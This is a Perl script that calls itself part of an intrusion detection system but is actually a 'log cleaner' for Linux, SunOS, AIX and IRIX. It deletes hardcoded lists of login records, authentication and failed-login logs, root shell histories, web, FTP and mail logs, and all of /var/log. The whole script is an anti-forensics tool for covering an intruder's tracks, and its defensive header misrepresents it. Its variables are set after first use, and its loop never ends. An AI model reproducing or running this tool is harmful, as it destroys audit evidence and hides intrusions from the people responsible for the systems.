#!usr/bin/perl -w



#    This file is part of Intrusion Detection System By - Raghav Bisht.

#

#    Intrusion Detection System By - Raghav Bisht is free software: you can redistribute it and/or modify

#    it under the terms of the GNU General Public License as published by

#    the Free Software Foundation, either version 3 of the License, or

#    (at your option) any later version.

#

#    Intrusion Detection System By - Raghav Bisht is distributed in the hope that it will be useful,

#    but WITHOUT ANY WARRANTY; without even the implied warranty of

#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the

#    GNU General Public License for more details.

#

#    You should have received a copy of the GNU General Public License

#    along with this program.  If not, see <http://www.gnu.org/licenses/>



require Term::ANSIColor;

use Term::ANSIColor;

   {  

   $resume = 1;  

    

   print color("red"),"############################\n";  

   print color("red"),"#       LOG CLEANER        #\n", color("reset");  

   print color("red"),"#         For OS           #\n", color("reset");  

   print color("red"),"#   linux, sunos, aix      #\n", color("reset");

   print color("red"),"#         & irix,          #\n", color("reset");  

   print color("red"),"############################\n", color("reset");  

    

   while($resume == 1)

   {  

     print color("blue"),"Enter The Name Of OS < linux, sunos, aix, irix >: ", color("reset");  

     chomp($os = <STDIN>); 

        

    

                if($os eq "linux"){ 

             print color("red"),"[+]Linux Selected...\n", color("reset");

             sleep 1;  

             print color("red"),"[+]Logs Located...\n", color("reset");

             sleep 1;  

             unlink @linux;

             sleep 1;  

             print color("red"),"[+]Logs Successfully Deleted...\n", color("reset");

              }

              

                

                

                

              if($os eq "sunos"){ 

              print color("red"),"[+]SunOS Selected...\n", color("reset");

              sleep 1;  

              print color("red"),"[+]Logs Located...\n", color("reset");

              sleep 1;  

              unlink @sunos;

              print color("red"),"[+]Logs Successfully Deleted...\n", color("reset");

              }

                

                

              if($os eq "aix"){

                 print color("red"),"[+]Aix Selected...\n", color("reset");

                 sleep 1;  

              print color("red"),"[+]Logs Located...\n", color("reset");

              sleep 1;  

              unlink @aix;

              print color("red"),"[+]Logs Successfully Deleted...\n", color("reset");

              }

              

                

                

              if($os eq "irix"){

              print color("red"),"[+]Irix Selected...\n", color("reset");

              sleep 1;  

              print color("red"),"[+]Logs Located...\n", color("reset");

              sleep 1;  

              unlink @irix;

              print color("red"),"[+]Logs Successfully Deleted...\n", color("reset");  

              }

      {

       @irix = ("/var/adm/SYSLOG", "/var/adm/sulog", "/var/adm/utmp", "/var/adm/utmpx",  

              "/var/adm/wtmp", "/var/adm/wtmpx", "/var/adm/lastlog/",  

            "/usr/spool/lp/log", "/var/adm/lp/lp-errs", "/usr/lib/cron/log",  

            "/var/adm/loginlog", "/var/adm/pacct", "/var/adm/dtmp",  

            "/var/adm/acct/sum/loginlog", "var/adm/X0msgs", "/var/adm/crash/vmcore",  

            "/var/adm/crash/unix")

           }

                      

      {

      @aix = ("/var/adm/pacct", "/var/adm/wtmp", "/var/adm/dtmp", "/var/adm/qacct",    

               "/var/adm/sulog", "/var/adm/ras/errlog", "/var/adm/ras/bootlog",  

               "/var/adm/cron/log", "/etc/utmp", "/etc/security/lastlog",  

               "/etc/security/failedlogin", "usr/spool/mqueue/syslog")

         }   

      { 

      @sunos = ("/var/adm/messages", "/var/adm/aculogs", "/var/adm/aculog",  

                 "/var/adm/sulog", "/var/adm/vold.log", "/var/adm/wtmp",  

                 "/var/adm/wtmpx", "/var/adm/utmp", "/var/adm/utmpx",  

                 "/var/adm/log/asppp.log", "/var/log/syslog",  

                 "/var/log/POPlog", "/var/log/authlog", "/var/adm/pacct",  

                 "/var/lp/logs/lpsched", "/var/lp/logs/requests",  

              "/var/cron/logs", "/var/saf/_log", "/var/saf/port/log")

         }

      {  

       @linux = ("/var/log/lastlog", "/var/log/telnetd", "/var/run/utmp",  

                 "/var/log/secure","/root/.ksh_history", "/root/.bash_history",  

                 "/root/.bash_logut", "/var/log/wtmp", "/etc/wtmp",  

                 "/var/run/utmp", "/etc/utmp", "/var/log", "/var/adm",  

                 "/var/apache/log", "/var/apache/logs", "/usr/local/apache/logs",  

                 "/usr/local/apache/logs", "/var/log/acct", "/var/log/xferlog",  

                 "/var/log/messages/", "/var/log/proftpd/xferlog.legacy",  

                 "/var/log/proftpd.xferlog", "/var/log/proftpd.access_log",  

                 "/var/log/httpd/error_log", "/var/log/httpsd/ssl_log",  

                 "/var/log/httpsd/ssl.access_log", "/etc/mail/access",  

                 "/var/log/qmail", "/var/log/smtpd", "/var/log/samba", "/var/lock/samba", "/root/.Xauthority",  

                 "/var/log/poplog", "/var/log/news.all", "/var/log/spooler",  

                 "/var/log/news", "/var/log/news/news", "/var/log/news/news.all",  

                 "/var/log/news/news.crit", "/var/log/news/news.err", "/var/log/news/news.notice",  

                 "/var/log/news/suck.err", "/var/log/news/suck.notice",  

                 "/var/spool/tmp", "/var/spool/errors", "/var/spool/logs", "/var/spool/locks",  

                 "/usr/local/www/logs/thttpd_log", "/var/log/thttpd_log",  

                 "/var/log/ncftpd/misclog.txt", "/var/log/nctfpd.errs",  

                 "/var/log/auth")

         }

          

      }

        

   }

